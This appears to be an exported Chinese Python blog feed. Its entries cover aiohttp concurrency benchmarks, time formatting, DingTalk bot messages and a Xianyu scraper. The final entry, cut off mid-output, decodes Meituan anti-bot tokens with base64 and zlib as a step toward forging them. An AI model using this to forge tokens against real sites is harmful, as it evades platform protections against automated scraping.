aiohttp 派上用场了。3.5 使用 aiohttpaiohttp 是一个支持异步请求的库，利用它和 asyncio 配合我们可以非常方便地实现异步请求操作。安装方式如下：pip3 install aiohttp1pip3 install aiohttp官方文档链接为：https://aiohttp.readthedocs.io/，它分为两部分，一部分是 Client，一部分是 Server，详细的内容可以参考官方文档。下面我们将 aiohttp 用上来，将代码改成如下样子：import asyncioimport aiohttpimport timestart = time.time()async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() session.close() return resultasync def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) result = await get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, result)tasks = [asyncio.ensure_future(request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))end = time.time()print(&apos;Cost time:&apos;, end - start)12345678910111213141516171819202122232425import asyncioimport aiohttpimport time start = time.time() async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() session.close() return result async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) result = await get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, result) tasks = [asyncio.ensure_future(request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) end = time.time()print(&apos;Cost time:&apos;, end - start)在这里我们将请求库由 requests 改成了 aiohttp，通过 aiohttp 的 ClientSession 类的 get() 方法进行请求，结果如下：Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 3.01995086669921881234567891011Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 3.0199508666992188成功了！我们发现这次请求的耗时由 15 秒变成了 3 秒，耗时直接变成了原来的 1/5。代码里面我们使用了 await，后面跟了 get() 方法，在执行这五个协程的时候，如果遇到了 await，那么就会将当前协程挂起，转而去执行其他的协程，直到其他的协程也挂起或执行完毕，再进行下一个协程的执行。开始运行时，时间循环会运行第一个 task，针对第一个 task 来说，当执行到第一个 await 跟着的 get() 方法时，它被挂起，但这个 get() 方法第一步的执行是非阻塞的，挂起之后立马被唤醒，所以立即又进入执行，创建了 ClientSession 对象，接着遇到了第二个 await，调用了 session.get() 请求方法，然后就被挂起了，由于请求需要耗时很久，所以一直没有被唤醒，好第一个 task 被挂起了，那接下来该怎么办呢？事件循环会寻找当前未被挂起的协程继续执行，于是就转而执行第二个 task 了，也是一样的流程操作，直到执行了第五个 task 的 session.get() 方法之后，全部的 task 都被挂起了。所有 task 都已经处于挂起状态，那咋办？只好等待了。3 秒之后，几个请求几乎同时都有了响应，然后几个 task 也被唤醒接着执行，输出请求结果，最后耗时，3 秒！怎么样？这就是异步操作的便捷之处，当遇到阻塞式操作时，任务被挂起，程序接着去执行其他的任务，而不是傻傻地等着，这样可以充分利用 CPU 时间，而不必把时间浪费在等待 IO 上。有人就会说了，既然这样的话，在上面的例子中，在发出网络请求后，既然接下来的 3 秒都是在等待的，在 3 秒之内，CPU 可以处理的 task 数量远不止这些，那么岂不是我们放 10 个、20 个、50 个、100 个、1000 个 task 一起执行，最后得到所有结果的耗时不都是 3 秒左右吗？因为这几个任务被挂起后都是一起等待的。理论来说确实是这样的，不过有个前提，那就是服务器在同一时刻接受无限次请求都能保证正常返回结果，也就是服务器无限抗压，另外还要忽略 IO 传输时延，确实可以做到无限 task 一起执行且在预想时间内得到结果。我们这里将 task 数量设置成 100，再试一下：tasks = [asyncio.ensure_future(request()) for _ in range(100)]1tasks = [asyncio.ensure_future(request()) for _ in range(100)]耗时结果如下：Cost time: 3.1062526702880861Cost time: 3.106252670288086最后运行时间也是在 3 秒左右，当然多出来的时间就是 IO 时延了。可见，使用了异步协程之后，我们几乎可以在相同的时间内实现成百上千倍次的网络请求，把这个运用在爬虫中，速度提升可谓是非常可观了。3.6 与单进程、多进程对比可能有的小伙伴非常想知道上面的例子中，如果 100 次请求，不是用异步协程的话，使用单进程和多进程会耗费多少时间，我们来测试一下：首先来测试一下单进程的时间：import requestsimport timestart = time.time()def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) result = requests.get(url).text print(&apos;Get response from&apos;, url, &apos;Result:&apos;, result)for _ in range(100): request()end = time.time()print(&apos;Cost time:&apos;, end - start)12345678910111213141516import requestsimport time start = time.time() def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) result = requests.get(url).text print(&apos;Get response from&apos;, url, &apos;Result:&apos;, result) for _ in range(100): request() end = time.time()print(&apos;Cost time:&apos;, end - start)最后耗时：Cost time: 305.166397094726561Cost time: 305.16639709472656接下来我们使用多进程来测试下，使用 multiprocessing 库：import requestsimport timeimport multiprocessingstart = time.time()def request(_): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) result = requests.get(url).text print(&apos;Get response from&apos;, url, &apos;Result:&apos;, result)cpu_count = multiprocessing.cpu_count()print(&apos;Cpu count:&apos;, cpu_count)pool = multiprocessing.Pool(cpu_count)pool.map(request, range(100))end = time.time()print(&apos;Cost time:&apos;, end - start)12345678910111213141516171819import requestsimport timeimport multiprocessing start = time.time() def request(_): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) result = requests.get(url).text print(&apos;Get response from&apos;, url, &apos;Result:&apos;, result) cpu_count = multiprocessing.cpu_count()print(&apos;Cpu count:&apos;, cpu_count)pool = multiprocessing.Pool(cpu_count)pool.map(request, range(100)) end = time.time()print(&apos;Cost time:&apos;, end - start)这里我使用了multiprocessing 里面的 Pool 类，即进程池。我的电脑的 CPU 个数是 8 个，这里的进程池的大小就是 8。运行时间：Cost time: 48.173069000244141Cost time: 48.17306900024414可见 multiprocessing 相比单线程来说，还是可以大大提高效率的。3.7 与多进程的结合既然异步协程和多进程对网络请求都有提升，那么为什么不把二者结合起来呢？在最新的 PyCon 2018 上，来自 Facebook 的 John Reese 介绍了 asyncio 和 multiprocessing 各自的特点，并开发了一个新的库，叫做 aiomultiprocess，感兴趣的可以了解下：https://www.youtube.com/watch?v=0kXaLh8Fz3k。这个库的安装方式是：pip3 install aiomultiprocess1pip3 install aiomultiprocess需要 Python 3.6 及更高版本才可使用。使用这个库，我们可以将上面的例子改写如下：import asyncioimport aiohttpimport timefrom aiomultiprocess import Poolstart = time.time()async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() session.close() return resultasync def request(): url = &apos;http://127.0.0.1:5000&apos; urls = [url for _ in range(100)] async with Pool() as pool: result = await pool.map(get, urls) return resultcoroutine = request()task = asyncio.ensure_future(coroutine)loop = asyncio.get_event_loop()loop.run_until_complete(task)end = time.time()print(&apos;Cost time:&apos;, end - start) import asyncioimport aiohttpimport timefrom aiomultiprocess import Pool start = time.time() async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() session.close() return result async def request(): url = ‘http://127.0.0.1:5000&#39; urls = [url for _ in range(100)] async with Pool() as pool: result = await pool.map(get, urls) return result coroutine = request()task = asyncio.ensure_future(coroutine)loop = asyncio.get_event_loop()loop.run_until_complete(task) end = time.time()print(‘Cost time:’, end - start)这样就会同时使用多进程和异步协程进行请求，当然最后的结果其实和异步是差不多的： Cost time: 3.11565704345703121Cost time: 3.1156570434570312`因为我的测试接口的原因，最快的响应也是 3 秒，所以这部分多余的时间基本都是 IO 传输时延。但在真实情况下，我们在做爬取的时候遇到的情况千变万化，一方面我们使用异步协程来防止阻塞，另一方面我们使用 multiprocessing 来利用多核成倍加速，节省时间其实还是非常可观的。 以上便是 Python 中协程的基本用法，希望对大家有帮助。]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python时间格式化]]></title>
    <url>%2F2019%2F04%2F26%2Fpython%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F%E5%8C%96%2F</url>
    <content type="text"><![CDATA[记录常用的时间格式化。time,datatime转换经常记不住 1234import timeprint time.time()输出的结果是：1279578704.6725271 但是这样是一连串的数字不是我们想要的结果，我们可以利用time模块的格式化时间的方法来处理：time.localtime(time.time())用time.localtime()方法，作用是格式化时间戳为本地的时间。输出的结果是：time.struct_time(tm_year=2010, tm_mon=7, tm_mday=19, tm_hour=22, tm_min=33, tm_sec=39, tm_wday=0, tm_yday=200, tm_isdst=0) 现在看起来更有希望格式成我们想要的时间了。time.strftime(‘%Y-%m-%d’,time.localtime(time.time())) 最后用time.strftime()方法，把刚才的一大串信息格式化成我们想要的东西，现在的结果是：2010-07-19 time.strftime里面有很多参数，可以让你能够更随意的输出自己想要的东西：下面是time.strftime的参数：strftime(format[, tuple]) -&gt; string将指定的struct_time(默认为当前时间)，根据指定的格式化字符串输出python中时间日期格式化符号：%y 两位数的年份表示（00-99）%Y 四位数的年份表示（000-9999）%m 月份（01-12）%d 月内中的一天（0-31）%H 24小时制小时数（0-23）%I 12小时制小时数（01-12）%M 分钟数（00=59）%S 秒（00-59） %a 本地简化星期名称%A 本地完整星期名称%b 本地简化的月份名称%B 本地完整的月份名称%c 本地相应的日期表示和时间表示%j 年内的一天（001-366）%p 本地A.M.或P.M.的等价符%U 一年中的星期数（00-53）星期天为星期的开始%w 星期（0-6），星期天为星期的开始%W 一年中的星期数（00-53）星期一为星期的开始%x 本地相应的日期表示%X 本地相应的时间表示%Z 当前时区的名称%% %号本身]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>时间</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb数据库]]></title>
    <url>%2F2019%2F04%2F26%2Fmongodb%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[python操作mongodb数据库，数据库基础操作，服务，链接，查询、更新、删除、级联……]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[钉钉]]></title>
    <url>%2F2019%2F04%2F26%2Fpython%E9%92%89%E9%92%89%2F</url>
    <content type="text"><![CDATA[记录使用钉钉开发者接口传输信息，比较好用。接口很丰富。 钉钉开发文档-群机器人 钉钉的开发者文档看着比较舒服就仔细看看了 自定义机器人如何创建创建自己的组织-&gt;创建群-&gt;创建添加自定义机器人（最多6个）-&gt;获得机器人的webhook-&gt;编程使用 机器人发送消息有6种 text类型 link类型 markdow类型 整体跳转ActionCard类型 独立跳转ActionCard类型 FeedCard类型 每种类型的格式text类型12345678910111213&#123; &quot;msgtype&quot;: &quot;text&quot;, &quot;text&quot;: &#123; &quot;content&quot;: &quot;我就是我, 是不一样的烟火@156xxxx8827&quot; &#125;, &quot;at&quot;: &#123; &quot;atMobiles&quot;: [ &quot;156xxxx8827&quot;, &quot;189xxxx8325&quot; ], &quot;isAtAll&quot;: false &#125;&#125; text 简单的收发消息，能@成员，钉钉机器人接口有限制，一个机器人一分钟之内只能发送20条信息。对于信息内容阿里做了监控，屏蔽一些不健康的信息。 这里可以尝试买安恒密盾 link类型12345678910 &quot;msgtype&quot;: &quot;link&quot;, &quot;link&quot;: &#123; &quot;text&quot;: &quot;这个即将发布的新版本，创始人陈航（花名“无招”）称它为“红树林”。而在此之前，每当面临重大升级，产品经理们都会取一个应景的代号，这一次，为什么是“红树林”？&quot;, &quot;title&quot;: &quot;时代的火车向前开&quot;, &quot;picUrl&quot;: &quot;&quot;, &quot;messageUrl&quot;: &quot;https://www.dingtalk.com/s?__biz=MzA4NjMwMTA2Ng==&amp;mid=2650316842&amp;idx=1&amp;sn=60da3ea2b29f1dcc43a7c8e4a7c97a16&amp;scene=2&amp;srcid=09189AnRJEdIiWVaKltFzNTw&amp;from=timeline&amp;isappinstalled=0&amp;key=&amp;ascene=2&amp;uin=&amp;devicetype=android-23&amp;version=26031933&amp;nettype=WIFI&quot; &#125;&#125; link不能跳转到app内应用 markdow类型1234567891011121314151617&#123; &quot;msgtype&quot;: &quot;markdown&quot;, &quot;markdown&quot;: &#123; &quot;title&quot;:&quot;杭州天气&quot;, &quot;text&quot;: &quot;#### 杭州天气 @156xxxx8827\n&quot; + &quot;&gt; 9度，西北风1级，空气良89，相对温度73%\n\n&quot; + &quot;&gt; ![screenshot](https://gw.alipayobjects.com/zos/skylark-tools/public/files/84111bbeba74743d2771ed4f062d1f25.png)\n&quot; + &quot;&gt; ###### 10点20分发布 [天气](http://www.thinkpage.cn/) \n&quot; &#125;, &quot;at&quot;: &#123; &quot;atMobiles&quot;: [ &quot;156xxxx8827&quot;, &quot;189xxxx8325&quot; ], &quot;isAtAll&quot;: false &#125; &#125; 对于分散性的数据，可以集中的推送。减少接口掉的频率，同时增加客观性 整体跳转ActionCard类型12345678910111213&#123; &quot;actionCard&quot;: &#123; &quot;title&quot;: &quot;乔布斯 20 年前想打造一间苹果咖啡厅，而它正是 Apple Store 的前身&quot;, &quot;text&quot;: &quot;![screenshot](serverapi2/@lADOpwk3K80C0M0FoA) ### 乔布斯 20 年前想打造的苹果咖啡厅 Apple Store 的设计正从原来满满的科技感走向生活化，而其生活化的走向其实可以追溯到 20 年前苹果一个建立咖啡馆的计划&quot;, &quot;hideAvatar&quot;: &quot;0&quot;, &quot;btnOrientation&quot;: &quot;0&quot;, &quot;singleTitle&quot; : &quot;阅读全文&quot;, &quot;singleURL&quot; : &quot;https://www.dingtalk.com/&quot; &#125;, &quot;msgtype&quot;: &quot;actionCard&quot;&#125; 独立跳转ActionCard类型123456789101112131415161718192021&#123; &quot;actionCard&quot;: &#123; &quot;title&quot;: &quot;乔布斯 20 年前想打造一间苹果咖啡厅，而它正是 Apple Store 的前身&quot;, &quot;text&quot;: &quot;![screenshot](serverapi2/@lADOpwk3K80C0M0FoA) ### 乔布斯 20 年前想打造的苹果咖啡厅 Apple Store 的设计正从原来满满的科技感走向生活化，而其生活化的走向其实可以追溯到 20 年前苹果一个建立咖啡馆的计划&quot;, &quot;hideAvatar&quot;: &quot;0&quot;, &quot;btnOrientation&quot;: &quot;0&quot;, &quot;btns&quot;: [ &#123; &quot;title&quot;: &quot;内容不错&quot;, &quot;actionURL&quot;: &quot;https://www.dingtalk.com/&quot; &#125;, &#123; &quot;title&quot;: &quot;不感兴趣&quot;, &quot;actionURL&quot;: &quot;https://www.dingtalk.com/&quot; &#125; ] &#125;, &quot;msgtype&quot;: &quot;actionCard&quot;&#125; FeedCard类型1234567891011121314151617&#123; &quot;feedCard&quot;: &#123; &quot;links&quot;: [ &#123; &quot;title&quot;: &quot;时代的火车向前开&quot;, &quot;messageURL&quot;: &quot;https://www.dingtalk.com/s?__biz=MzA4NjMwMTA2Ng==&amp;mid=2650316842&amp;idx=1&amp;sn=60da3ea2b29f1dcc43a7c8e4a7c97a16&amp;scene=2&amp;srcid=09189AnRJEdIiWVaKltFzNTw&amp;from=timeline&amp;isappinstalled=0&amp;key=&amp;ascene=2&amp;uin=&amp;devicetype=android-23&amp;version=26031933&amp;nettype=WIFI&quot;, &quot;picURL&quot;: &quot;https://www.dingtalk.com/&quot; &#125;, &#123; &quot;title&quot;: &quot;时代的火车向前开2&quot;, &quot;messageURL&quot;: &quot;https://www.dingtalk.com/s?__biz=MzA4NjMwMTA2Ng==&amp;mid=2650316842&amp;idx=1&amp;sn=60da3ea2b29f1dcc43a7c8e4a7c97a16&amp;scene=2&amp;srcid=09189AnRJEdIiWVaKltFzNTw&amp;from=timeline&amp;isappinstalled=0&amp;key=&amp;ascene=2&amp;uin=&amp;devicetype=android-23&amp;version=26031933&amp;nettype=WIFI&quot;, &quot;picURL&quot;: &quot;https://www.dingtalk.com/&quot; &#125; ] &#125;, &quot;msgtype&quot;: &quot;feedCard&quot;&#125; 代码示例python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120import jsonfrom datetime import datetimeimport requestsclass DingMsg(): def __init__(self): self.HEADERS = &#123; &quot;Content-Type&quot;: &quot;application/json ;charset=utf-8 &quot; &#125; def parse_data(self, data): self.keyword = data.get(&apos;keyword&apos;) self.img_src = data.get(&apos;img_src&apos;) self.title = data.get(&apos;title&apos;) self.xianyu_url = data.get(&apos;pic_href&apos;) self.pub_time = data.get(&apos;pub_time&apos;) self.price = data.get(&apos;price&apos;) self.location = data.get(&apos;location&apos;) self.desc = data.get(&apos;desc&apos;) def text_msg_content(self): self.parse_data(self.data) text = &apos;&#123;title&#125;\n&#123;xianyu_url&#125;\n关键字：&#123;keyword&#125;\n价格：&#123;price&#125; \n时间:&#123;pub_time&#125;&apos;.format(title=self.title, xianyu_url=self.xianyu_url, keyword=self.keyword, price=self.price, pub_time=self.pub_time) return &#123; &quot;msgtype&quot;: &quot;text&quot;, &quot;text&quot;: &#123; &quot;content&quot;: text &#125;, &quot;at&quot;: &#123; # &quot;atMobiles&quot;: [ # ], &quot;isAtAll&quot;: True &#125; &#125; def link_msg_content(self): self.parse_data(self.data) # 链接的话，手机端没法直接点进去展示，电脑端可以展示 link_text = &apos;&#123;title&#125;\n时间：&#123;pub_time&#125;&apos;.format(title=self.title, pub_time=self.pub_time) return &#123; &quot;msgtype&quot;: &quot;link&quot;, &quot;link&quot;: &#123; &quot;text&quot;: link_text, &quot;title&quot;: &apos;闲鱼&quot;&#123;&#125;&quot;最新商品消息&apos;.format(self.keyword), &quot;picUrl&quot;: self.img_src, &quot;messageUrl&quot;: self.xianyu_url &#125; &#125; def markd_msg_content(self): markdown_content = &quot;&quot; for item in self.data: self.parse_data(item) markdown_content += &quot;---------------------------------\n \n&quot; \ &quot;#### **关键字:** &#123;keyword&#125;\n&quot; \ &quot;###### 价格:&#123;price&#125; 时间:&#123;pub_time&#125;\n&quot; \ &quot;#### 标题:&#123;title&#125;\n&quot; \ &quot;#### 链接:[&#123;xianyu_url&#125;](&#123;xianyu_url&#125;)\n&quot;.format(keyword=self.keyword, price=self.price, pub_time=self.pub_time, title=self.title, xianyu_url=self.xianyu_url) return &#123; &quot;msgtype&quot;: &quot;markdown&quot;, &quot;markdown&quot;: &#123; &quot;title&quot;: &quot;新增闲鱼商品&quot;, &quot;text&quot;: &quot;## **新增闲鱼商品** \n&quot; + &quot; ###### &#123;&#125; 发布\n&quot;.format(datetime.now().strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)) + markdown_content &#125;, &quot;at&quot;: &#123; # &quot;atMobiles&quot;: [ # &quot;156xxxx8827&quot;, # &quot;189xxxx8325&quot; # ], &quot;isAtAll&quot;: True &#125; &#125; def check_msg_content(self): return &#123; &quot;msgtype&quot;: &quot;text&quot;, &quot;text&quot;: &#123; &quot;content&quot;: self.data &#125;, &quot;at&quot;: &#123; # &quot;atMobiles&quot;: [ # ], &quot;isAtAll&quot;: True &#125; &#125; def send_msg(self, webhook_url, data, type): # 这里的message是你想要推送的文字消息三种格式 ：text_msg_content link_msg_content markd_msg_content self.data = data if type == 1: mesBody = self.text_msg_content() elif type == 2: mesBody = self.link_msg_content() elif type == 3: mesBody = self.markd_msg_content() else: mesBody = self.check_msg_content() MessageBody = json.dumps(mesBody) result = requests.post(url=webhook_url, data=MessageBody, headers=self.HEADERS) print(result.text) try: if result.json().get(&apos;errmsg&apos;) == &apos;ok&apos;: return True elif result.json().get(&apos;errmsg&apos;) == &apos;消息中包含不合适的内容&apos;: return True else: return False except Exception as e: return False]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闲鱼数据爬取]]></title>
    <url>%2F2019%2F04%2F26%2Fxianyu%2F</url>
    <content type="text"><![CDATA[写了一个异步爬取闲鱼商品最新信息推送到钉钉 随便写的，想到哪写到哪 图中的需求有两个部分值得学习。 多线程爬取最新关键字的商品信息 python对钉钉的操作 多线程爬取最新关键字的商品信息这个多线程是依靠关键字的数量，启动线程。比如可以是线程数=关键字的数量/5。具体接口参考github组织中的例子，24小时采集 然后将线程加入到while True中。关键字与价格区间可以在闲鱼接口链接中自定义。 python对钉钉的操作针对钉钉是一个很好的信息传输方式，钉钉的开发文档详细讲述了如何调用钉钉的api。 注册钉钉账号 手机创建钉钉组织 用自己创建的组织登录桌面版的钉钉应用（要用自己创建组织的钉钉才能登录带有自己权限的管理后台-web端亦是如此） 创建群聊。在群聊中找到机器人，自定义机器人，找到webhook（这便是钉钉的发送信息的api） 查阅钉钉开发者文档 虽然没有python版的介绍。可是api是通用的。api介绍也是很丰富。 推荐看下web版的后台管理，这是一个很好的开发场地。 如何知道获取最新的商品数据 使用数据库，将爬取商品的详情链接存储到数据库中，每次判断数据库中是否有此商品链接数据，若存在，便不是最新。若不存在，推送到钉钉群，然后数据插入数据库。 优化数库的存储方式 暂停与开始这个方面我没有深入思考，简单的把关键字存到数据库中，没一次线程爬取从数据库中读取现有的数据库关键字。 暂停就是数据库中的某个关键字的字段删除。 （这点为了不值得使用吧！） 使用说明本项目采用异步爬取，对于闲鱼速度快，效率高。 注意事项 钉钉接口每个机器人每分钟只能发送20条信息。次数太多会被限制。一个群聊可以创建6个机器人的webhook。建议将次6条都加入到程序的机器人队列 钉钉接口存在敏感字检测。当爬取的信息触发了阿里系的检测系统，信息不能发送。这里在日志面板给出已经提示。 经过测试100多关键字的爬取效率在8-10s内完成。 给出的关键字描述尽可能精确，避免大范围的搜索。如错误示例：关键字‘空调’ 范围广与‘空调’+品牌 或 ’空调‘+ 功能部件，缩小搜索范围。 程序的爬取频率设定时间尽量多一些。否者爬取的发送信息很多，将导致钉钉接口失效。这里爬取频率代表一个全部爬虫结束到下一次爬虫开始的时间。建议设置为10s左右。将会10秒后进行下一次执行。 发送方式 ：1-单文本发送（若消息过多，钉钉接口限制），2-连接文本发送（手机端不支持跳转闲鱼app），3-markdown文本（推荐、将一次爬取的消息汇聚到个文本中，较少钉钉接口压力） 添加关键字：关键字不为空，价格若不填则搜索时为全价。 删除关键字：选中关键字任务，点击删除，确认删除。 单项开启：选中关键字任务，点击开启，任务单独开启 单项关闭：选中关键字任务，点击关闭，任务单独关闭 一键开启：点击一键开启，默认开启全部任务 一键关闭：点击一键关闭，默认关闭全部任务 更新配置：实时更新爬取频率，发送方式 清除缓存：清除缓存文件。软件长时间使用产生大量缓存文件，硬件运行效率下降 清空配置：清除所有配置选项+缓存文件。一般不建议使用 日志文件：输出日志信息 系统日志：输入操作信息 钉钉机器人-添加机器人：添加钉钉机器人的webhook完整链接 钉钉机器人-删除机器人：选中机器人链接，点击删除，删除成功 钉钉机器人-测试机器人：测试插入的webhook是否有效。将发送’欢迎测试闲鱼信息及时推送器-机器人验证’到钉钉群 推荐数据]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[美团店铺数据token解析与生成]]></title>
    <url>%2F2019%2F04%2F11%2F%E7%BE%8E%E5%9B%A2token%2F</url>
    <content type="text"><![CDATA[介绍：要想解析token，首先得弄清楚其使用的加密算法，而对于美团的token，加密算法其实比较简单，就是采用了二进制压缩与base64编码。 要想解析token，首先得弄清楚其使用的加密算法，而对于美团的token，加密算法其实比较简单，就是采用了二进制压缩与base64编码。所以解析token主要分为两个步骤：一是base64解码，二是二进制解压。解析token时主要用到了base64和zlib两个库，下面以实际例子来验证。 首先定义解析token方法：123456def decode_token(token): # base64解码 token_decode = base64.b64decode(token.encode()) # 二进制解压 token_string = zlib.decompress(token_decode) return token_string 然后获取多个美团的token，调用decode_token方法进行解析：1234567891011if __name__ == &apos;__main__&apos;: token = [ &apos;eJxVjstuqzAURf/F06LYxkAgUgeQ0MvzkoQ8QFUHbngnJgGcpKG6/35dqR1UOtLeZ501OJ+gdzMwwwgZCEnglvdgBvAETTQgAT6Ii6qqsqxPsUIMIoHDb6bIhgTe+90CzF4xwkiaqujti6wFeMWGjCSMdIF+uiK6rIj5slwhgYrzyzCDsBwnLK/5lbaTw5lB0YeqhgeMofgECJ1thC7y+J30O/nPHorXhTvUZSta7t2z5sij+2iuqiuMqyT3lDH961/cpPO5/7IZojDYtlraKOfij7JtjiFG8yGyya3cO0TLCiiXZtMG9+xkLi1rSM9r4sEqXch6Qcan5WXbMs9edilVt3ubIXYKrHUXxXSJu8bmL5auGLt8nXgqbntVM6N459ZGjGwSnIp4rGoe1h+Qre5Dn+3plG4e88ZtF0fM/KvR3iKHXuerfSf3FtRPtMvIIXmi2Q2N2chI+95somyc15phQmdlOlH0cGgRBszmflI+P4N//wEWi44a&apos;, &apos;eJxVjstuozAUht/F26LYBkxDpC4gocN1SEIuoGoWbsw1MQngJC1V372u1C5GOtJ/Od/i/wC9x8AMI2QipIBb3oMZwBM0MYACxCA/hBBVQwgjYmIFHP7vDGIq4LXfLcDsBcusPBL077tZy+IFmypSMJrK6tfr0qu6vG/KkxCohLgMMwjLccLzWlxpOzmcOZR+qGp4wBjKJUDifCNxqccfpT8qfnMkp0t2qMtWuty/s+Yo4vtoraorTKo09/Ux+xtcvLQLRPC8GeIo3LZG1ujn4o++bY4RRvMhdrRbuXc1gxVQLa2mDe/sZC1te8jOa82HVbZQp4U2Piwv25b7zrLLKNnuHY74KbTXXZzQJe4aRzzbU93c5evUJ7jtiWHFyc6rzQQ5WngqkrGqRVS/Qb66Dz3b00e6eZ83Xrs4Yh5czfYWu/Q6X+07tbfh9EQ7ph3SB8puaGQj19rXZhOzcV4bpgXdleXG8btLiyjkjgjS8ukJfH4B4qqN+w==&apos;, &apos;eJxdjktvozAURv+Lt0WxjYFCpC4gocNzSEIeoGoWbswzMQngJFNG89/HldrNSFf6vnvuWdw/YPAZmGOELIQUcC8GMAd4hmYGUIAY5UXXdZUg3USEmAo4/scsSwHvw34J5m8YYaQ86+jXJ9lI8IYtFSkYmRJ9d012VZPzaflSArUQ13EOYTXNeNGIG+1mxwuHso91A48YQ/kJkDrfSl3m6SvpV4rvPZavS3dsqk62Iniw9iSSx2Sv6xtM66wItCn/GV79rA9F+LodkzjadUbeapfyh7ZrTzFGizFxyb06eMRgJVQru+2iBzvbK8cZ88uGBLDOl6pZkulpdd11PHBXfU713cHliJ8jZ9MnKV3hvnXFq2Nq1r7YZIGOu0E37CTd+42VIpdE5zKd6kbEzW/I149xYAf6TLcfi9bvlifMw5vV3ROP3hbrQ68ODjTPtGfkmD1RdkcTmzjp3tttwqZFY1g29Na2lyQfHi3jiLsizKqXF/D3Hwp7jhM=&apos;, &apos;eJxdjktvozAURv+Lt0WxjYGESF1AQofnkIQ8QFUXbngndgI4yZTR/PdxpXZT6Urfd889i/sX9F4O5hghEyEF3IsezAGeoIkBFCAGedF1XSUIY4OougKOP5gxVcB7v1+C+StGGClTHb19ko0Er9hUkYLRTKLvrsmuanI+LU9KoBbiOswhrMYJKxpxo3xyvDAo+1A38IgxlJ8AqbOt1GWevpJ+pfjeI/m6dIem4rIV/iNvTyJ+jNa6vsGkTgtfG7PfwdVLu0AEL9shjsIdN7JWu5S/tF17ijBaDLFD7tXBJUZeQrWyWh4+8rO1su0hu2yID+tsqc5KMj6trjvOfGfVZVTfHRyG2Dm0N12c0BXuWke82DPN3Beb1Ncx73XDipO915gJckh4LpOxbkTU/IFs/Rj6/ECndPuxaD2+PGEW3Ex+j116W6wPndrbcHamXU6O6RPN72jMR0b4e7uN83HRGKYF3bXlxvGHS8soZI4I0ur5Gfz7D+r3jgA=&apos; ] for i in range(0, len(token)): token1 = decode_token(token[i]) print(token1) 最后解析后得到了以下的结果：1234b&apos;&#123;&quot;rId&quot;:100900,&quot;ver&quot;:&quot;1.0.6&quot;,&quot;ts&quot;:1555228714393,&quot;cts&quot;:1555228714429,&quot;brVD&quot;:[1010,750],&quot;brR&quot;:[[1920,1080],[1920,1040],24,24],&quot;bI&quot;:[&quot;https://gz.meituan.com/meishi/c11/&quot;,&quot;&quot;],&quot;mT&quot;:[],&quot;kT&quot;:[],&quot;aT&quot;:[],&quot;tT&quot;:[],&quot;aM&quot;:&quot;&quot;,&quot;sign&quot;:&quot;eJwdjktOwzAQhu/ShXeJ4zYNKpIXqKtKFTsOMLUn6Yj4ofG4UjkM10CsOE3vgWH36df/2gAjnLwdlAPBBsYoR3J/hYD28f3z+PpUnmJEPqYa5UWEm0mlLBRqOSaP1qjEtFB849VeRXJ51nr56AOSVIi9S0E3LlfSzhitMix/mQwsrdWa7aTyCjInDk1mKu9nvOHauCQWq2rB/8laqd3cX+adv0zdzm3nbjTOdzCi69A/HQAHOOyHafMLmEtKXg==&quot;&#125;&apos;b&apos;&#123;&quot;rId&quot;:100900,&quot;ver&quot;:&quot;1.0.6&quot;,&quot;ts&quot;:1555230010591,&quot;cts&quot;:1555230010659,&quot;brVD&quot;:[1010,750],&quot;brR&quot;:[[1920,1080],[1920,1040],24,24],&quot;bI&quot;:[&quot;https://gz.meituan.com/meishi/c11/&quot;,&quot;&quot;],&quot;mT&quot;:[],&quot;kT&quot;:[],&quot;aT&quot;:[],&quot;tT&quot;:[],&quot;aM&quot;:&quot;&quot;,